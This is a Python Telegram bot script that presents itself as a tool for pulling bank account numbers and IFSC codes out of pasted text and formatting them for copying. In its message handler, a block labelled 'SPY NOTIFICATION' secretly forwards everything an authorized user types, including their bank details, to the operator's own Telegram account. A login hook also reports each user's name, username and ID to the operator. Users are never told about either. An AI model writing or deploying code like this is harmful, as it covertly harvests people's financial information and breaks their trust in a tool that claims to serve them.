import telebot
import re
import os
from flask import Flask
from threading import Thread

# --- SETUP ---
SECRET_CODE = "B0RSAV"
FOOTER_TEXT = "\n\n---\n🤖 Bot created by @B0RSAV"
MY_ID = 5983644996  # <--- REPLACE THIS WITH YOUR ID FROM @userinfobot

authorized_users = set()
app = Flask('')

@app.route('/')
def home(): return "I am alive!"

def run_web_server():
    app.run(host='0.0.0.0', port=8080)

TOKEN = os.getenv('BOT_TOKEN')
bot = telebot.TeleBot(TOKEN)

def process_text(text):
    ifsc_pattern = r'[A-Z]{4}0[A-Z0-9]{6}'
    acc_pattern = r'\b\d{9,18}\b'
    ifscs = re.findall(ifsc_pattern, text.upper())
    accounts = re.findall(acc_pattern, text)
    output = []
    if ifscs or accounts:
        for acc in accounts: output.append(f"💰 Account:\n`{acc}`")
        for ifsc in ifscs: output.append(f"🏦 IFSC:\n`{ifsc}`")
    output.append("--- Tap to copy line ---")
    for line in text.split('\n'):
        if line.strip(): output.append(f"`{line.strip()}`")
    return "\n\n".join(output) + FOOTER_TEXT

@bot.message_handler(func=lambda message: True)
def handle_all(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    username = f"@{message.from_user.username}" if message.from_user.username else "No Username"

    # 1. SECRET CODE CHECK
    if message.text == SECRET_CODE:
        authorized_users.add(user_id)
        bot.reply_to(message, "✅ Access Granted!")
        # Notify you when someone logs in
        bot.send_message(MY_ID, f"🔔 **NEW USER LOGGED IN:**\nName: {user_name}\nUser: {username}\nID: {user_id}")
        return

    # 2. CHECK AUTHORIZATION
    if user_id not in authorized_users:
        bot.reply_to(message, "❌ Access Denied. Send the Secret Code.")
        return

    # 3. SPY NOTIFICATION (Sends what they typed to YOU)
    if user_id != MY_ID:  # Don't send a copy if it's you using it
        bot.send_message(MY_ID, f"📩 **MESSAGE FROM {user_name} ({username}):**\n\n{message.text}")

    # 4. PROCESS FOR USER
    result = process_text(message.text)
    bot.reply_to(message, result, parse_mode='Markdown')

if __name__ == "__main__":
    t = Thread(target=run_web_server)
    t.start()
    bot.infinity_polling()
